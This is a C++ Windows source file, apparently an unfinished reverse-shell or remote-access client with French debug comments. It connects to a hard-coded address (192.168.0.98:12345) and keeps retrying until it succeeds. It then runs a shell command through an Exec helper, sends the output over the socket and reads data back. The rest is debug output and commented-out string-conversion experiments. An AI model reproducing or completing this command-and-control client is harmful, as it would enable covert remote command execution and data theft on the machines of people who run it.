
#define _UNICODE // https://sourceforge.net/p/mingw-w64/wiki2/Unicode%20apps/
#define UNICODE 

using namespace std;

#include "../inc/master.h"
#include "../inc/common.h"
#include "../inc/Exec.h"

wstring testlol()
{   
    WCHAR tazmail[21] =L"juan";
    return (wstring) tazmail;

}


int main()
{
    
    wcout << testlol() << endl;
    wcout << MAX_PATH << endl;
    WCHAR test1[MAX_PATH];
    wcout << sizeof(test1) << " vs " << MAX_PATH << endl;
   
    Sleep(500);
    WSADATA WSAData; 
    
    SOCKET sock;
    SOCKADDR_IN address_client;

    WSAStartup(MAKEWORD(2,0), &WSAData);
    
    sock =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket

    address_client.sin_addr.s_addr= inet_addr("192.168.0.98");
    address_client.sin_family = AF_INET;
    address_client.sin_port = htons(12345);

   // cout << "1: " << test << endl;
    //int size_of_wchar = 

    while(connect(sock,(SOCKADDR *)&address_client, sizeof(address_client)))
    {   
        Sleep(2000);
        //Whait...;  
    } 

    _setmode(_fileno(stdout), 0x00020000); //Si cette fonction est called alors il est impossible d'utilisee cout
    WCHAR buff_wchar[4096];

    while(true)
    {
        wcout << "CONNECTED" << endl;

        wstring input;

        getline(wcin, input);
        Exec exec;
        vector<wstring> result;
        result = exec.executeCommand(L"dir");

        for(int i=0;i< result.size(); i++)
        {
            send(sock, (char *)result[i].c_str(), wcslen(result[i].c_str()) * sizeof(WCHAR), 0);
            //wcout << result[i] << endl;
            wcout << "size: " << result[i].size() << endl; 

            ZeroMemory(&buff_wchar, wcslen(buff_wchar));
        
        }
        char tamer[200];
        //int stast=  recv(sock, tamer, sizeof(tamer), 0);
        int stast = recv(sock, (char *)buff_wchar, sizeof(buff_wchar), 0);
      //cout <<"010110>"  << tamer << endl;
        wcout << "status: " << stast << endl;
        wcout << "---->" << buff_wchar <<"<---" << endl;

        wcout << "len: " << wcslen(buff_wchar) << endl;
        wcout  << sizeof(buff_wchar) << endl;
        _wsystem(L"pause");
        break;

        //wcout << "commande: " << input << endl;
        //wcout <<"what: " << wcslen(input.c_str()) * sizeof(WCHAR) << endl;

         
        //Exec exec;
        //vector<wstring> cmd = exec.executeCommand("dir");
       // wcout << "------>   "<< cmd[0] <<"<-------" << endl;

       // send(sock, (char *)cmd[0].c_str(), wcslen(cmd[0].c_str()) * sizeof(WCHAR), 0);
        //send(sock, test, strlen(test), 0); found wtf
      //  WCHAR buff[MAX_PATH];
      //  _wgetcwd(buff, MAX_PATH); ne marche pas. Le serveur recoit C:\Users\cisco\Desktop\New folder\fntz\"oW[
      
        /*
        WCHAR buff[MAX_PATH];
        GetCurrentDirectoryW(MAX_PATH, buff);
        wcout << buff << endl;
        wcout << wcslen(buff) * sizeof(WCHAR) << " vs " << wcslen(buff) << endl;
        send(sock, (char *)buff, wcslen(buff) * sizeof(WCHAR), 0);
        */
        /*
        CHAR char1[] = "trestts";
        cout << "char1: " << char1 <<endl;
        cout << "MB_CUR_MAX: " << MB_CUR_MAX << endl;
        WCHAR char2[1000];
        int test = mbtowc(char2,char1, MB_CUR_MAX);
        wcout <<"---." <<char2 << endl;
        cout << "test: " << test << endl;
        */
        /*
        int size_for_tchar = MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, char1, strlen(char1), NULL, 0); // find the buffer size
        cout << "size: " << size_for_tchar << endl;
        WCHAR * wchar2 = new WCHAR[size_for_tchar];

        MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, char1, strlen(char1), wchar2, size_for_tchar);
        wcout << "---->" << wchar2 << endl;
        delete [] wchar2;
        */

        input.erase();
       
    }
    return 0;
}